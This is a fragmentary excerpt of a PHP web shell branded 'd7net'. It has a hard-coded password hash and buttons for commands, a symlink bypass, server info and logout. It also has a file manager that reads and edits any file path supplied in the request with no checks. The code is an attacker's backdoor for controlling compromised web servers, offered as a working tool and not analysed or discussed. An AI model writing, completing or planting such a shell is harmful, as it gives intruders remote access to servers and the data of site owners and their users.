...
$d7netp = '0480db1e3ad32a62a15382222dae4332'; // kepongentod
$color = '#00ff00';
...
echo '<th> &nbsp;<a class="button" href="?path='.$lokasi.'&cmd=d7net">&#9741; Command</a>&nbsp; </th>';
...
echo '<th> &nbsp;<a class="button" href="?logout">Logout</a>&nbsp; </th>';
echo "</table><br>";

if (isset($_GET['fileloc'])) {
    echo "<tr><td><center>Current File : ".$_GET['fileloc'];
    echo '</center></tr></td></table><br/>';
    echo "<center><textarea cols=100 rows=25 readonly=''>" .htmlspecialchars(file_get_contents($_GET['fileloc']))."</textarea></center>";
    author();
    ...
    echo '<form method="post">
    <textarea cols=100 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
    <input type="hidden" name="path" value="'.$_POST['path'].'">
...
if ($_GET['sym_bypas'] == 'd7net') {
	...
	<input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='nama_file.htm '><br>
...
elseif ($_REQUEST['info'] == "d7net") {
	echo "<br><table width='100%' border='0' cellpadding='5' cellspacing='5' align='center'><tr><td>";
...
foreach($lokasinya as $dir){
    ...
    echo "<tr>
    <td><img src='https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png' alt='Smiley face' width='25' heght='25'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
    <td><center>--</center></td>
...
echo "<tr>
<td>".cekfile($lokasi."/".$file)."<img src='https://img.icons8.com/external-kmg-design-outline-color-kmg-design/2x/external-file-web-hosting-kmg-design-outline-color-kmg-design.png' alt='Smiley face' width='25' heght='25'><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
